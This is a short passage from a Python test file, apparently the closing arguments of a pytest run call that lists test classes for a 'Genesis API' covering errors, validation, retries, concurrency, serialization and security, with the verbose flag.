        __file__ + "::TestGenesisAPIAdvancedErrorScenarios",
        __file__ + "::TestGenesisAPIAdvancedValidation", 
        __file__ + "::TestGenesisAPIAdvancedRetryLogic",
        __file__ + "::TestGenesisAPIAdvancedConcurrency",
        __file__ + "::TestGenesisAPIDataIntegrityAndSerialization",
        __file__ + "::TestGenesisAPISecurityAndResilience",
        "-v"
    ])
